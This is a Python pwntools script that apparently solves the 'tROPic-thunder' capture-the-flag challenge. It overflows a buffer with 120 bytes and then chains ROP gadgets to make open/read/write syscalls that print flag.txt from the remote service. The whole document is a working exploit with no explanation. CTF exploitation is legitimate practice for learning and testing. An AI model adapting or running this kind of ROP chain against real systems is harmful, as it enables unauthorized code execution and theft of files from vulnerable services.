from pwn import *

# p = process('./tROPic-thunder')
# gdb.attach(p, gdbscript='b *main+120')

p = remote('thunder.sdc.tf', 1337)

elf = ELF('./tROPic-thunder')
rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret']).address
pop_rsi = rop.find_gadget(['pop rsi', 'ret']).address
pop_rdx = rop.find_gadget(['pop rdx', 'ret']).address
pop_rax = rop.find_gadget(['pop rax', 'ret']).address
syscall = rop.find_gadget(['syscall', 'ret']).address
bss = elf.bss()

payload = b'A' * 120

# read flag.txt -> .bss
payload += p64(pop_rdi)
payload += p64(0)
payload += p64(pop_rsi)
payload += p64(bss)
payload += p64(pop_rdx)
payload += p64(8)
payload += p64(pop_rax)
payload += p64(0)
payload += p64(syscall)

# OPEN FILE
payload += p64(pop_rdi)
payload += p64(bss)
payload += p64(pop_rsi)
payload += p64(0)
payload += p64(pop_rax)
payload += p64(2)
payload += p64(pop_rdx)
payload += p64(0)
payload += p64(syscall)

# READ FILE
payload += p64(pop_rax)
payload += p64(0)
payload += p64(pop_rsi)
payload += p64(bss)
payload += p64(pop_rdx)
payload += p64(0xff)
payload += p64(pop_rdi)
payload += p64(3)
payload += p64(syscall)

# WRITE FILE
payload += p64(pop_rax)
payload += p64(1)
payload += p64(pop_rdi)
payload += p64(1)
payload += p64(pop_rsi)
payload += p64(bss)
payload += p64(pop_rdx)
payload += p64(0xff)
payload += p64(syscall)

print(p.recv().decode(errors='ignore'))
p.sendline(payload)
p.sendline(b'flag.txt')
print(p.recv().decode(errors='ignore'))
